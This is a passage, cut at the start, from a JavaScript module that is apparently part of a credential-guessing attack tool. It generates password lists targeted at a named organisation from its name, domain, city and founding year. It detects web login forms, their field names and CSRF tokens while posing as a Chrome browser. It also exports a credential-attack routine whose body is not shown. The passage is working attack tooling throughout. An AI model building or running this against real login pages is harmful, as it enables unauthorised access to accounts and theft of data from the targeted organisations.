    (c) => c.protocol === protocol || c.port === port && isCompatibleProtocol(c.protocol, protocol)
  );
}
function isCompatibleProtocol(stored, target) {
  const httpGroup = ["http_form", "http_basic", "http_digest", "http_json_api"];
  return httpGroup.includes(stored) && httpGroup.includes(target);
}
function getPasswordLists() {
  return Object.entries(BUILTIN_PASSWORD_LISTS).map(([name, list]) => ({
    name,
    displayName: list.name,
    description: list.description,
    category: list.category,
    count: list.passwords.length
  }));
}
function getUsernameLists() {
  return Object.entries(BUILTIN_USERNAME_LISTS).map(([name, list]) => ({
    name,
    displayName: list.name,
    description: list.description,
    category: list.category,
    count: list.usernames.length
  }));
}
function getPasswordList(name) {
  return BUILTIN_PASSWORD_LISTS[name]?.passwords || [];
}
function getUsernameList(name) {
  return BUILTIN_USERNAME_LISTS[name]?.usernames || [];
}
function getAllDefaultCredentials() {
  return [...DEFAULT_CREDENTIALS];
}
function generateTargetedPasswordList(orgInfo) {
  const passwords = [];
  const name = orgInfo.companyName.toLowerCase().replace(/[^a-z0-9]/g, "");
  const nameCapitalized = orgInfo.companyName.charAt(0).toUpperCase() + name.slice(1);
  const domain = orgInfo.domain.split(".")[0];
  const years = ["2024", "2025", "2026", "24", "25", "26"];
  const suffixes = ["!", "@", "#", "1", "123", "!!", "@1", "@123", "1!", "!1"];
  const seasons = ["Spring", "Summer", "Fall", "Winter"];
  for (const year of years) {
    passwords.push(`${name}${year}`, `${nameCapitalized}${year}`, `${domain}${year}`);
    for (const suffix of suffixes) {
      passwords.push(`${name}${year}${suffix}`, `${nameCapitalized}${year}${suffix}`, `${domain}${year}${suffix}`);
    }
  }
  for (const season of seasons) {
    for (const year of years) {
      passwords.push(`${season}${name}${year}`, `${season}@${name}`);
    }
  }
  passwords.push(
    `${name}admin`,
    `admin${name}`,
    `${name}pass`,
    `pass${name}`,
    `${name}123`,
    `${name}1234`,
    `${name}12345`,
    `${name}!`,
    `Welcome${name}`,
    `${nameCapitalized}Welcome`,
    `${nameCapitalized}1`
  );
  if (orgInfo.city) {
    const city = orgInfo.city.charAt(0).toUpperCase() + orgInfo.city.slice(1).toLowerCase();
    for (const year of years) {
      passwords.push(`${city}${year}`, `${city}${year}!`);
    }
  }
  if (orgInfo.foundedYear) {
    passwords.push(
      `${name}${orgInfo.foundedYear}`,
      `${nameCapitalized}${orgInfo.foundedYear}`,
      `${name}${orgInfo.foundedYear}!`,
      `${nameCapitalized}${orgInfo.foundedYear}!`
    );
  }
  return {
    name: `targeted_${name}`,
    description: `Targeted password list for ${orgInfo.companyName}`,
    category: "targeted",
    passwords: [...new Set(passwords)]
  };
}
async function detectWebLoginForm(url) {
  try {
    const resp = await fetch(url, {
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0" },
      signal: AbortSignal.timeout(15e3),
      redirect: "follow"
    });
    const html = await resp.text();
    const hasPasswordField = /type=["']password["']/i.test(html);
    if (!hasPasswordField) {
      return { detected: false, formConfig: null, analysis: "No password field found on page" };
    }
    const formMatch = html.match(/<form[^>]*action=["']([^"']*?)["'][^>]*>([\s\S]*?)<\/form>/i);
    const usernameMatch = html.match(/name=["']((?:user|email|login|username|account)[^"']*?)["']/i);
    const passwordMatch = html.match(/name=["']((?:pass|password|pwd|secret)[^"']*?)["']/i);
    const csrfMatch = html.match(/name=["']((?:csrf|_token|__RequestVerificationToken|authenticity_token)[^"']*?)["']/i);
    const formAction = formMatch?.[1] || "";
    const usernameField = usernameMatch?.[1] || "username";
    const passwordField = passwordMatch?.[1] || "password";
    const csrfTokenName = csrfMatch?.[1] || void 0;
    const isJsonApi = /application\/json|api\/|\/api/i.test(html) || /fetch\(|axios\./i.test(html);
    const formConfig = {
      loginUrl: url,
      loginFormAction: formAction ? new URL(formAction, url).toString() : url,
      usernameField,
      passwordField,
      csrfTokenName,
      csrfTokenUrl: csrfTokenName ? url : void 0,
      contentType: isJsonApi ? "json" : "form",
      failureIndicator: "invalid|incorrect|failed|wrong|error|denied|Invalid credentials"
    };
    return {
      detected: true,
      formConfig,
      analysis: `Login form detected: username field="${usernameField}", password field="${passwordField}", action="${formAction || "same page"}", CSRF=${csrfTokenName || "none"}`
    };
  } catch (err) {
    return { detected: false, formConfig: null, analysis: `Error: ${err.message}` };
  }
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
export {
  detectWebLoginForm,
  executeCredentialAttack,
  generateTargetedPasswordList,
  getAllDefaultCredentials,
  getDefaultCredentialsForTarget,
  getPasswordList,
  getPasswordLists,
  getUsernameList,
  getUsernameLists
};
